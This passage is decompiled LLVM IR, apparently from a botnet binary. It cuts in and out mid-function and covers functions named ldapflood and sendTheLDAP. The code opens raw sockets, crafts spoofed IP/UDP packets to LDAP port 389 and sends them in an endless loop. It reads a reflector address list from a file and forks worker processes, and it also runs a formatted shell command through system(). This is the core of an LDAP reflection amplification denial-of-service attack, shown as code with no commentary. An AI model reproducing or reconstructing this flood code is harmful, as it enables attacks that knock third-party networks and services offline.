  %v3_804da80 = add i32 %v4_804da68, 2
  %v4_804da80 = inttoptr i32 %v3_804da80 to i16*
  store i16 %v1_804da80, i16* %v4_804da80, align 2
  %v1_804da87 = add i32 %v4_804da68, 6
  %v2_804da87 = inttoptr i32 %v1_804da87 to i16*
  store i16 0, i16* %v2_804da87, align 2
  %v1_804da90 = add i32 %v4_804da68, 8
  %v1_804da93 = inttoptr i32 %v1_804da90 to i8*
  store i1 false, i1* @df, align 1
  %v7_804daa0 = call i8* @_memcpy(i8* %v1_804da93, i8* bitcast (i8** @global_var_806a400.129 to i8*), i32 51)
  %v8_804daa0 = ptrtoint i8* %v7_804daa0 to i32
  store i32 %v8_804daa0, i32* @ecx, align 4
  %v2_804daa9 = call i32 @htons(i16 59)
  %v1_804dab4 = trunc i32 %v2_804daa9 to i16
  %v4_804dab4 = add i32 %v4_804da68, 4
  %v5_804dab4 = inttoptr i32 %v4_804dab4 to i16*
  store i16 %v1_804dab4, i16* %v5_804dab4, align 2
  %v2_804dabb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dabb, i32* @esi, align 4
  ret i32 %v4_804da68

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @ldapflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4148 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  %v2_804dacf = ptrtoint i32* %stack_var_-4128 to i32
  %v1_804dadb = add i32 %v2_804dacf, 20
  %v5_804dade = inttoptr i32 %v1_804dadb to i16*
  %v1_804daed = add i32 %arg1, 12
  %v2_804daed = inttoptr i32 %v1_804daed to i32*
  %v3_804daed = load i32, i32* %v2_804daed, align 4
  %v1_804db0b = add i32 %arg1, 4
  %v2_804db0b = inttoptr i32 %v1_804db0b to i32*
  %v3_804db0b = load i32, i32* %v2_804db0b, align 4
  %v3_804db28 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804db30 = icmp slt i32 %v3_804db28, 0
  %v1_804db34 = icmp eq i1 %v5_804db30, false
  br i1 %v1_804db34, label %dec_label_pc_804db42, label %dec_label_pc_804db36

dec_label_pc_804db36:                             ; preds = %entry
  %v1_804db3d = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804db42

dec_label_pc_804db42:                             ; preds = %entry, %dec_label_pc_804db36
  %v2_804db49 = call i32 @__GI_time(i32* null)
  %v1_804db51 = call i32 @init_rand(i32 %v2_804db49)
  %v3_804db72 = bitcast i32* %stack_var_-4128 to i8*
  %v4_804db72 = call i32 @__GI_memset(i8* %v3_804db72, i32 0, i32 4096)
  %v2_804db7d = call i32 @setup_ldap_ip_header(i8* %v3_804db72)
  %v2_804db88 = call i32 @setup_ldap_udp_header(i16* %v5_804dade)
  %v0_804db8d = call i32 @random()
  %v2_804dbb5 = sdiv i32 %v0_804db8d, 13107
  store i32 %v2_804dbb5, i32* @ebx, align 4
  %tmp26 = mul i32 %v2_804dbb5, -65535
  %v2_804dbce = add i32 %tmp26, %v0_804db8d
  %v1_804dbdd = add i32 %v2_804dbce, 64510
  %v1_804dbe8 = trunc i32 %v1_804dbdd to i16
  %v2_804dbe8 = call i32 @htons(i16 %v1_804dbe8)
  %v1_804dbf3 = trunc i32 %v2_804dbe8 to i16
  store i16 %v1_804dbf3, i16* %v5_804dade, align 4
  %v2_804dbff = add i32 %v2_804dacf, 12
  %v3_804dbff = inttoptr i32 %v2_804dbff to i32*
  store i32 %v3_804daed, i32* %v3_804dbff, align 4
  %v1_804dc05 = add i32 %v3_804db0b, 4
  %v2_804dc05 = inttoptr i32 %v1_804dc05 to i32*
  %v3_804dc05 = load i32, i32* %v2_804dc05, align 4
  %v2_804dc0b = add i32 %v2_804dacf, 16
  %v3_804dc0b = inttoptr i32 %v2_804dc0b to i32*
  store i32 %v3_804dc05, i32* %v3_804dc0b, align 4
  %v1_804dc11 = or i32 %v2_804dacf, 2
  %v2_804dc11 = inttoptr i32 %v1_804dc11 to i16*
  %v3_804dc11 = load i16, i16* %v2_804dc11, align 2
  %div = udiv i16 %v3_804dc11, 2
  %v2_804dc15 = zext i16 %div to i32
  %v2_804dc27 = bitcast i32* %stack_var_-4128 to i16*
  %v3_804dc27 = call i32 @csum(i16* %v2_804dc27, i32 %v2_804dc15)
  %v1_804dc32 = trunc i32 %v3_804dc27 to i16
  %v3_804dc32 = add i32 %v2_804dacf, 10
  %v4_804dc32 = inttoptr i32 %v3_804dc32 to i16*
  store i16 %v1_804dc32, i16* %v4_804dc32, align 2
  store i32 1, i32* %stack_var_-4148, align 4
  %v2_804dc40 = ptrtoint i32* %stack_var_-4148 to i32
  %v5_804dc6e = call i32 @__GI_setsockopt(i32 %v3_804db28, i32 0, i32 3, i32 %v2_804dc40, i32 4)
  %v2_804dc73 = icmp slt i32 %v5_804dc6e, 0
  %v1_804dc75 = icmp eq i1 %v2_804dc73, false
  br i1 %v1_804dc75, label %dec_label_pc_804dc83, label %dec_label_pc_804dc77

dec_label_pc_804dc77:                             ; preds = %dec_label_pc_804db42
  %v1_804dc7e = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804dc83

dec_label_pc_804dc83:                             ; preds = %dec_label_pc_804db42, %dec_label_pc_804dc77
  %v2_804dc8a = call i32 @__GI_time(i32* null)
  %v1_804dc92 = call i32 @init_rand(i32 %v2_804dc8a)
  %v3_804dd05 = add i32 %v2_804dacf, 4
  %v4_804dd05 = inttoptr i32 %v3_804dd05 to i16*
  br label %dec_label_pc_804dca1

dec_label_pc_804dca1:                             ; preds = %dec_label_pc_804dd60, %dec_label_pc_804dc83
  %stack_var_-20.0 = phi i32 [ %v3_804db0b, %dec_label_pc_804dc83 ], [ %v3_804dcdd, %dec_label_pc_804dd60 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804dc83 ], [ %v4_804dd60, %dec_label_pc_804dd60 ]
  %v3_804dca9 = load i16, i16* %v2_804dc11, align 2
  %v4_804dca9 = zext i16 %v3_804dca9 to i32
  %v6_804dcd5 = call i32 @sendto(i32 %v3_804db28, i32 %v2_804dacf, i32 %v4_804dca9, i32 0, i32 %stack_var_-20.0, i32 16)
  %v1_804dcdd = add i32 %stack_var_-20.0, 532
  %v2_804dcdd = inttoptr i32 %v1_804dcdd to i32*
  %v3_804dcdd = load i32, i32* %v2_804dcdd, align 4
  %v1_804dce9 = add i32 %v3_804dcdd, 4
  %v2_804dce9 = inttoptr i32 %v1_804dce9 to i32*
  %v3_804dce9 = load i32, i32* %v2_804dce9, align 4
  store i32 %v3_804dce9, i32* %v3_804dc0b, align 4
  %v1_804dcf2 = call i32 @rand_cmwc(i32 %v3_804dcdd)
  %v1_804dcfa = call i32 @htonl(i32 %v1_804dcf2)
  %v1_804dd05 = trunc i32 %v1_804dcfa to i16
  store i16 %v1_804dd05, i16* %v4_804dd05, align 4
  %v3_804dd0c = load i16, i16* %v2_804dc11, align 2
  %div27 = udiv i16 %v3_804dd0c, 2
  %v2_804dd10 = zext i16 %div27 to i32
  %v3_804dd22 = call i32 @csum(i16* %v2_804dc27, i32 %v2_804dd10)
  %v1_804dd2d = trunc i32 %v3_804dd22 to i16
  store i16 %v1_804dd2d, i16* %v4_804dc32, align 2
  %v0_804dd31 = load i64, i64* @global_var_807e2e0.88, align 8
  %v1_804dd31 = trunc i64 %v0_804dd31 to i32
  %v1_804dd36 = add i32 %v1_804dd31, 1
  %v1_804dd37 = sext i32 %v1_804dd36 to i64
  store i64 %v1_804dd37, i64* @global_var_807e2e0.88, align 32
  %v0_804dd3c = load i32, i32* @global_var_807e1a8.89, align 8
  %v6_804dd47 = icmp ugt i32 %v0_804dd3c, %storemerge
  br i1 %v6_804dd47, label %dec_label_pc_804dd60, label %dec_label_pc_804dd49

dec_label_pc_804dd49:                             ; preds = %dec_label_pc_804dca1
  %v0_804dd53 = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804dd5b = sext i32 %v0_804dd53 to i64
  %v2_804dd5b = call i32 @usleep(i64 %v1_804dd5b)
  br label %dec_label_pc_804dd60

dec_label_pc_804dd60:                             ; preds = %dec_label_pc_804dca1, %dec_label_pc_804dd49
  %stack_var_-4156.0 = phi i32 [ %storemerge, %dec_label_pc_804dca1 ], [ 0, %dec_label_pc_804dd49 ]
  %v4_804dd60 = add i32 %stack_var_-4156.0, 1
  br label %dec_label_pc_804dca1

; uselistorder directives
  uselistorder i32 %v3_804dcdd, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v2_804dbb5, { 1, 0 }
  uselistorder i32 %v0_804db8d, { 1, 0 }
  uselistorder i32 %v2_804dacf, { 5, 1, 2, 0, 3, 4, 6 }
  uselistorder i32* %stack_var_-4148, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dd60, { 1, 0 }
  uselistorder label %dec_label_pc_804dc83, { 1, 0 }
  uselistorder label %dec_label_pc_804db42, { 1, 0 }
}

define i32 @sendTheLDAP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1104 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804dd85 = call i32 @mfork(i32 %arg2)
  store i32 %v2_804dd85, i32* %eax.global-to-local, align 4
  %v1_804dd8a = icmp eq i32 %v2_804dd85, 0
  %v1_804dd8c = icmp eq i1 %v1_804dd8a, false
  br i1 %v1_804dd8c, label %dec_label_pc_804e360, label %dec_label_pc_804dd92

dec_label_pc_804dd92:                             ; preds = %entry
  %v5_804dda9 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v5_804dda9, i32* %eax.global-to-local, align 4
  %v5_804ddb1 = icmp slt i32 %v5_804dda9, 0
  %v1_804ddb5 = icmp eq i1 %v5_804ddb1, false
  br i1 %v1_804ddb5, label %dec_label_pc_804ddc3, label %dec_label_pc_804ddb7

dec_label_pc_804ddb7:                             ; preds = %dec_label_pc_804dd92
  %v2_804ddbe = call i32 @__GI_exit(i32 1)
  store i32 %v2_804ddbe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddc3

dec_label_pc_804ddc3:                             ; preds = %dec_label_pc_804dd92, %dec_label_pc_804ddb7
  %v4_804ddc3 = add i32 %arg3, -5
  %v9_804ddc3 = sub i32 4, %arg3
  %v10_804ddc3 = and i32 %v9_804ddc3, %arg3
  %v11_804ddc3 = icmp slt i32 %v10_804ddc3, 0
  %v12_804ddc3 = icmp eq i32 %v4_804ddc3, 0
  %v13_804ddc3 = icmp slt i32 %v4_804ddc3, 0
  %v3_804ddc7 = icmp eq i1 %v13_804ddc3, %v11_804ddc3
  %v4_804ddc7 = icmp eq i1 %v12_804ddc3, false
  %v5_804ddc7 = and i1 %v4_804ddc7, %v3_804ddc7
  br i1 %v5_804ddc7, label %dec_label_pc_804ddef, label %dec_label_pc_804ddc9

dec_label_pc_804ddc9:                             ; preds = %dec_label_pc_804ddc3
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804ddde = call i32 @Send(i32 %arg1, i32 ptrtoint ([113 x i8]* @global_var_806a434.130 to i32))
  store i32 %v3_804ddde, i32* %eax.global-to-local, align 4
  %v2_804ddea = call i32 @__GI_exit(i32 1)
  store i32 %v2_804ddea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddef

dec_label_pc_804ddef:                             ; preds = %dec_label_pc_804ddc3, %dec_label_pc_804ddc9
  %v3_804ddf6 = call i32 @__GI_time(i32* null)
  %v1_804de01 = add i32 %arg4, 24
  store i32 %v1_804de01, i32* %eax.global-to-local, align 4
  %v1_804de04 = inttoptr i32 %v1_804de01 to i32*
  %v2_804de04 = load i32, i32* %v1_804de04, align 4
  %v1_804de0c = add i32 %arg4, 12
  store i32 %v1_804de0c, i32* %eax.global-to-local, align 4
  %v1_804de0f = inttoptr i32 %v1_804de0c to i32*
  %v2_804de0f = load i32, i32* %v1_804de0f, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804de1c = and i32 %v2_804de0f, -256
  store i32 %v1_804de1c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804de1f = inttoptr i32 %v2_804de0f to i8*
  %v3_804de25 = call i32 @_strlen(i8* %v4_804de1f)
  %v4_804de25 = mul i32 %v3_804de25, -1
  %v5_804de25 = add i32 %v4_804de25, -2
  store i32 %v5_804de25, i32* %ecx.global-to-local, align 4
  %v1_804de2b = sub i32 0, %v4_804de25
  store i32 %v1_804de2b, i32* %edx.global-to-local, align 4
  %v2_804de33 = mul i32 %v3_804de25, 5
  %v1_804de35 = add i32 %v2_804de33, 160
  store i32 %v1_804de35, i32* %eax.global-to-local, align 4
  %v4_804de3d = add i32 %v2_804de33, -863
  %v9_804de3d = sub i32 862, %v2_804de33
  %v10_804de3d = and i32 %v9_804de3d, %v1_804de35
  %v11_804de3d = icmp slt i32 %v10_804de3d, 0
  %v12_804de3d = icmp eq i32 %v4_804de3d, 0
  %v13_804de3d = icmp slt i32 %v4_804de3d, 0
  %v3_804de44 = icmp eq i1 %v13_804de3d, %v11_804de3d
  %v4_804de44 = icmp eq i1 %v12_804de3d, false
  %v5_804de44 = and i1 %v4_804de44, %v3_804de44
  br i1 %v5_804de44, label %dec_label_pc_804e360, label %dec_label_pc_804de4a

dec_label_pc_804de4a:                             ; preds = %dec_label_pc_804ddef
  store i32 %v1_804de0c, i32* %eax.global-to-local, align 4
  %v2_804de50 = load i32, i32* %v1_804de0f, align 4
  store i32 %v2_804de50, i32* %edx.global-to-local, align 4
  store i32 %v1_804de0c, i32* %eax.global-to-local, align 4
  %v2_804de58 = load i32, i32* %v1_804de0f, align 4
  store i32 %v2_804de58, i32* %ecx.global-to-local, align 4
  store i32 %v1_804de0c, i32* %eax.global-to-local, align 4
  %v2_804de60 = load i32, i32* %v1_804de0f, align 4
  store i32 %v2_804de60, i32* @ebx, align 4
  store i32 %v1_804de0c, i32* %eax.global-to-local, align 4
  %v2_804de68 = load i32, i32* %v1_804de0f, align 4
  store i32 %v2_804de68, i32* @esi, align 4
  store i32 %v1_804de0c, i32* %eax.global-to-local, align 4
  %v2_804de70 = load i32, i32* %v1_804de0f, align 4
  store i32 %v1_804de35, i32* @edi, align 4
  %v2_804de95 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v2_804de95, i32* %eax.global-to-local, align 4
  %v9_804de9e = call i32 @__GI_snprintf(i32 %v2_804de95, i32 %v1_804de35, i32 ptrtoint ([176 x i8]* @global_var_806a4a8.131 to i32), i32 %v2_804de70, i32 %v2_804de68, i32 %v2_804de60, i32 %v2_804de58)
  store i32 %v2_804de95, i32* %eax.global-to-local, align 4
  %v2_804deac = call i32 @system(i32 %v2_804de95)
  store i32 %v2_804deac, i32* %eax.global-to-local, align 4
  %v3_804deb8 = call i32 @__GI_time(i32* null)
  store i32 %v3_804deb8, i32* %eax.global-to-local, align 4
  %v2_804dec0 = call i32 @srand(i32 %v3_804deb8)
  store i32 0, i32* @global_var_807f300.80, align 256
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804dee3 = call i32 @malloc(i32 128)
  store i32 %v2_804dee3, i32* %edx.global-to-local, align 4
  %v1_804def1 = inttoptr i32 %v2_804dee3 to i8*
  store i32 %v2_804dee3, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804def8 = call i8* @_memset(i8* %v1_804def1, i32 0, i32 128)
  %v6_804def8 = ptrtoint i8* %v5_804def8 to i32
  store i32 %v6_804def8, i32* %ecx.global-to-local, align 4
  %v0_804defa = load i32, i32* %edx.global-to-local, align 4
  %v1_804df02 = add i32 %arg4, 16
  store i32 %v1_804df02, i32* %eax.global-to-local, align 4
  %v1_804df05 = inttoptr i32 %v1_804df02 to i32*
  %v2_804df05 = load i32, i32* %v1_804df05, align 4
  store i32 %v2_804df05, i32* %eax.global-to-local, align 4
  %v2_804df0a = call i32 @atol(i32 %v2_804df05)
  %v1_804df15 = add i32 %arg4, 20
  store i32 %v1_804df15, i32* %eax.global-to-local, align 4
  %v1_804df18 = inttoptr i32 %v1_804df15 to i32*
  %v2_804df18 = load i32, i32* %v1_804df18, align 4
  store i32 %v2_804df18, i32* %eax.global-to-local, align 4
  %v2_804df1d = call i32 @atol(i32 %v2_804df18)
  store i32 %v2_804df1d, i32* @eax, align 4
  store i32 0, i32* @global_var_807e1a8.89, align 8
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v3_804df4f = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_806a558.132 to i32), i32 ptrtoint ([2 x i8]* @global_var_8069c83.83 to i32))
  store i32 %v3_804df4f, i32* %eax.global-to-local, align 4
  %v4_804e0cf = inttoptr i32 %v0_804defa to i8*
  %v1_804df6a = and i32 %v0_804defa, -256
  %v5_804dfd0 = add i32 %v0_804defa, -1
  br label %dec_label_pc_804e0be.outer

dec_label_pc_804df5c:                             ; preds = %dec_label_pc_804e0be
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804df6a, i32* %eax.global-to-local, align 4
  %v3_804df73 = call i32 @_strlen(i8* %v4_804e0cf)
  %v4_804df73 = mul i32 %v3_804df73, -1
  %v5_804df73 = add i32 %v4_804df73, -2
  store i32 %v5_804df73, i32* %ecx.global-to-local, align 4
  %v5_804df7a = sub i32 %v0_804defa, %v4_804df73
  %v1_804df7d = add i32 %v5_804df7a, -1
  store i32 %v1_804df7d, i32* %eax.global-to-local, align 4
  %v1_804df7e = inttoptr i32 %v1_804df7d to i8*
  %v2_804df7e = load i8, i8* %v1_804df7e, align 1
  %v3_804df7e = zext i8 %v2_804df7e to i32
  store i32 %v3_804df7e, i32* %eax.global-to-local, align 4
  %v10_804df81 = icmp eq i8 %v2_804df7e, 10
  br i1 %v10_804df81, label %dec_label_pc_804dfb2, label %dec_label_pc_804df85

dec_label_pc_804df85:                             ; preds = %dec_label_pc_804df5c
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804df6a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804defa, i32* @edi, align 4
  %v3_804df9c = call i32 @_strlen(i8* %v4_804e0cf)
  %v4_804df9c = mul i32 %v3_804df9c, -1
  %v5_804df9c = add i32 %v4_804df9c, -2
  store i32 %v5_804df9c, i32* @ecx, align 4
  %v5_804dfa3 = sub i32 %v0_804defa, %v4_804df9c
  %v1_804dfa6 = add i32 %v5_804dfa3, -1
  store i32 %v1_804dfa6, i32* %eax.global-to-local, align 4
  %v1_804dfa7 = inttoptr i32 %v1_804dfa6 to i8*
  %v2_804dfa7 = load i8, i8* %v1_804dfa7, align 1
  %v3_804dfa7 = zext i8 %v2_804dfa7 to i32
  store i32 %v3_804dfa7, i32* %eax.global-to-local, align 4
  %v10_804dfaa = icmp eq i8 %v2_804dfa7, 13
  %v1_804dfac = icmp eq i1 %v10_804dfaa, false
  br i1 %v1_804dfac, label %dec_label_pc_804e0be, label %dec_label_pc_804dfb2

dec_label_pc_804dfb2:                             ; preds = %dec_label_pc_804df85, %dec_label_pc_804df5c
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804df6a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804defa, i32* @edi, align 4
  %v3_804dfc9 = call i32 @_strlen(i8* %v4_804e0cf)
  %v4_804dfc9 = mul i32 %v3_804dfc9, -1
  %v5_804dfc9 = add i32 %v4_804dfc9, -2
  store i32 %v5_804dfc9, i32* @ecx, align 4
  %v1_804dfd3 = sub i32 %v5_804dfd0, %v4_804dfc9
  %v1_804dfd4 = inttoptr i32 %v1_804dfd3 to i8*
  store i8 0, i8* %v1_804dfd4, align 1
  %v0_804dfd7 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804dfd7, i32* %eax.global-to-local, align 4
  %v1_804dfdc = icmp eq i32 %v0_804dfd7, 0
  %v1_804dfde = icmp eq i1 %v1_804dfdc, false
  %v2_804e050 = call i32 @malloc(i32 540)
  store i32 %v2_804e050, i32* %eax.global-to-local, align 4
  br i1 %v1_804dfde, label %dec_label_pc_804e049, label %dec_label_pc_804dfe0

dec_label_pc_804dfe0:                             ; preds = %dec_label_pc_804dfb2
  store i32 %v2_804e050, i32* @global_var_807f300.80, align 256
  store i32 %v2_804e050, i32* %eax.global-to-local, align 4
  %v1_804dff6 = inttoptr i32 %v2_804e050 to i32*
  store i32 0, i32* %v1_804dff6, align 4
  %v0_804dffc = load i32, i32* %eax.global-to-local, align 4
  %v1_804dffc = add i32 %v0_804dffc, 4
  %v2_804dffc = inttoptr i32 %v1_804dffc to i32*
  store i32 0, i32* %v2_804dffc, align 4
  %v0_804e003 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e003 = add i32 %v0_804e003, 8
  %v2_804e003 = inttoptr i32 %v1_804e003 to i32*
  store i32 0, i32* %v2_804e003, align 4
  %v0_804e00a = load i32, i32* %eax.global-to-local, align 4
  %v1_804e00a = add i32 %v0_804e00a, 12
  %v2_804e00a = inttoptr i32 %v1_804e00a to i32*
  store i32 0, i32* %v2_804e00a, align 4
  %v0_804e011 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804e011, i32* @ebx, align 4
  store i32 %v0_804defa, i32* %eax.global-to-local, align 4
  %v2_804e01d = call i32 @inet_addr(i32 %v0_804defa)
  %v1_804e022 = load i32, i32* @ebx, align 4
  %v2_804e022 = add i32 %v1_804e022, 4
  %v3_804e022 = inttoptr i32 %v2_804e022 to i32*
  store i32 %v2_804e01d, i32* %v3_804e022, align 4
  %v0_804e025 = load i32, i32* @global_var_807f300.80, align 256
  %v2_804e030 = add i32 %v0_804e025, 532
  %v3_804e030 = inttoptr i32 %v2_804e030 to i32*
  store i32 %v0_804e025, i32* %v3_804e030, align 4
  %v0_804e036 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804e036, i32* @edx, align 4
  store i32 %v0_804e036, i32* %eax.global-to-local, align 4
  %v2_804e041 = add i32 %v0_804e036, 536
  %v3_804e041 = inttoptr i32 %v2_804e041 to i32*
  store i32 %v0_804e036, i32* %v3_804e041, align 4
  br label %dec_label_pc_804e0bb

dec_label_pc_804e049:                             ; preds = %dec_label_pc_804dfb2
  store i32 %v2_804e050, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v4_804e06e = inttoptr i32 %v2_804e050 to i8*
  %v6_804e071 = call i32 @__GI_memset(i8* %v4_804e06e, i32 0, i32 540)
  store i32 %v0_804defa, i32* %eax.global-to-local, align 4
  %v2_804e07c = call i32 @inet_addr(i32 %v0_804defa)
  %v2_804e086 = add i32 %v2_804e050, 4
  %v3_804e086 = inttoptr i32 %v2_804e086 to i32*
  store i32 %v2_804e07c, i32* %v3_804e086, align 4
  %v0_804e089 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804e089, i32* %edx.global-to-local, align 4
  %v2_804e092 = add i32 %v2_804e050, 536
  %v3_804e092 = inttoptr i32 %v2_804e092 to i32*
  store i32 %v0_804e089, i32* %v3_804e092, align 4
  %v0_804e098 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804e098, i32* %eax.global-to-local, align 4
  %v1_804e09d = add i32 %v0_804e098, 532
  %v2_804e09d = inttoptr i32 %v1_804e09d to i32*
  %v3_804e09d = load i32, i32* %v2_804e09d, align 4
  %v2_804e0a6 = add i32 %v2_804e050, 532
  %v3_804e0a6 = inttoptr i32 %v2_804e0a6 to i32*
  store i32 %v3_804e09d, i32* %v3_804e0a6, align 4
  %v0_804e0ac = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804e0ac, i32* @edx, align 4
  store i32 %v2_804e050, i32* %eax.global-to-local, align 4
  %v2_804e0b5 = add i32 %v0_804e0ac, 532
  %v3_804e0b5 = inttoptr i32 %v2_804e0b5 to i32*
  store i32 %v2_804e050, i32* %v3_804e0b5, align 4
  br label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804dfe0, %dec_label_pc_804e049
  br label %dec_label_pc_804e0be.outer

dec_label_pc_804e0be.outer:                       ; preds = %dec_label_pc_804e0bb, %dec_label_pc_804de4a
  br label %dec_label_pc_804e0be

dec_label_pc_804e0be:                             ; preds = %dec_label_pc_804e0be.outer, %dec_label_pc_804df85
  store i32 %v0_804defa, i32* %eax.global-to-local, align 4
  %v5_804e0d2 = call i32 @fgets(i32 %v0_804defa, i32 128, i32 %v3_804df4f)
  store i32 %v5_804e0d2, i32* %eax.global-to-local, align 4
  %v1_804e0d7 = icmp eq i32 %v5_804e0d2, 0
  %v1_804e0d9 = icmp eq i1 %v1_804e0d7, false
  br i1 %v1_804e0d9, label %dec_label_pc_804df5c, label %dec_label_pc_804e0df

dec_label_pc_804e0df:                             ; preds = %dec_label_pc_804e0be
  %v0_804e0df = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804e0df, i32* %eax.global-to-local, align 4
  %v1_804e0e4 = add i32 %v0_804e0df, 532
  %v2_804e0e4 = inttoptr i32 %v1_804e0e4 to i32*
  %v3_804e0e4 = load i32, i32* %v2_804e0e4, align 4
  %v2_804e0f0 = mul i32 %v2_804df0a, 4
  %v1_804e0f6 = add i32 %v2_804e0f0, 30
  %v2_804e0f9 = and i32 %v1_804e0f6, -16
  %v0_804e0ff = load i32, i32* @esp, align 4
  %v2_804e0ff = sub i32 %v0_804e0ff, %v2_804e0f9
  %v1_804e111 = add i32 %v2_804e0ff, 47
  %v2_804e114 = and i32 %v1_804e111, -16
  %v1_804e135 = add i32 %arg4, 4
  store i32 %v1_804e135, i32* %eax.global-to-local, align 4
  %v1_804e138 = inttoptr i32 %v1_804e135 to i32*
  %v2_804e138 = load i32, i32* %v1_804e138, align 4
  store i32 %v2_804e138, i32* %eax.global-to-local, align 4
  %v2_804e13a = inttoptr i32 %v2_804e0ff to i32*
  store i32 %v2_804e138, i32* %v2_804e13a, align 4
  %v1_804e13d = call i32 @inet_addr(i32 %v2_804e114)
  store i32 %v2_804df0a, i32* %edx.global-to-local, align 4
  %v2_804e153 = mul i32 %v2_804df0a, 24
  %v1_804e159 = add i32 %v2_804e153, 30
  %v2_804e15c = and i32 %v1_804e159, -16
  %v0_804e162 = load i32, i32* @esp, align 4
  %v2_804e162 = sub i32 %v0_804e162, %v2_804e15c
  %v1_804e174 = add i32 %v2_804e162, 47
  %v2_804e177 = and i32 %v1_804e174, -16
  store i32 %v2_804e177, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804e24759 = icmp sgt i32 %v2_804df0a, 0
  br i1 %v5_804e24759, label %dec_label_pc_804e198.lr.ph, label %dec_label_pc_804e24d

dec_label_pc_804e198.lr.ph:                       ; preds = %dec_label_pc_804e0df
  %v3_804e1ca = or i32 %v2_804e177, 8
  br label %dec_label_pc_804e198

dec_label_pc_804e198:                             ; preds = %dec_label_pc_804e198, %dec_label_pc_804e198.lr.ph
  %storemerge60 = phi i32 [ 0, %dec_label_pc_804e198.lr.ph ], [ %v4_804e23e, %dec_label_pc_804e198 ]
  %v1_804e1a4 = mul i32 %storemerge60, 24
  %v3_804e1ae = add i32 %v1_804e1a4, %v2_804e177
  %v4_804e1ae = inttoptr i32 %v3_804e1ae to i32*
  store i32 %storemerge60, i32* %v4_804e1ae, align 8
  store i32 %v2_804e177, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e1a4, i32* %edx.global-to-local, align 4
  %v4_804e1ca = add i32 %v3_804e1ca, %v1_804e1a4
  %v5_804e1ca = inttoptr i32 %v4_804e1ca to i32*
  store i32 2, i32* %v5_804e1ca, align 8
  %v1_804e1d4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e1d4 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804e1d4 = add i32 %v1_804e1d4, 12
  %v4_804e1d4 = add i32 %v3_804e1d4, %v2_804e1d4
  %v5_804e1d4 = inttoptr i32 %v4_804e1d4 to i32*
  store i32 %v1_804e13d, i32* %v5_804e1d4, align 4
  %v1_804e1de = load i32, i32* %edx.global-to-local, align 4
  %v2_804e1de = load i32, i32* %ecx.global-to-local, align 4
  %v3_804e1de = add i32 %v1_804e1de, 16
  %v4_804e1de = add i32 %v3_804e1de, %v2_804e1de
  %v5_804e1de = inttoptr i32 %v4_804e1de to i32*
  %v1_804e1e8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e1e8 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804e1e8 = add i32 %v1_804e1e8, 20
  %v4_804e1e8 = add i32 %v3_804e1e8, %v2_804e1e8
  %v5_804e1e8 = inttoptr i32 %v4_804e1e8 to i32*
  %v1_804e1fd = or i32 %v3_804e1ae, 4
  %v2_804e203 = inttoptr i32 %v1_804e1fd to i32*
  store i32 %v3_804e0e4, i32* %v2_804e203, align 4
  store i32 %v3_804e1ae, i32* @ecx, align 4
  store i32 %v2_804e114, i32* %edx.global-to-local, align 4
  %v2_804e21c = mul i32 %storemerge60, 4
  %v2_804e21f = add i32 %v2_804e21c, %v2_804e114
  store i32 %v2_804e21f, i32* %eax.global-to-local, align 4
  %v1_804e222 = load i32, i32* @esp, align 4
  %v2_804e222 = add i32 %v1_804e222, 12
  %v3_804e222 = inttoptr i32 %v2_804e222 to i32*
  store i32 %v3_804e1ae, i32* %v3_804e222, align 4
  %v0_804e226 = load i32, i32* @esp, align 4
  %v1_804e226 = add i32 %v0_804e226, 8
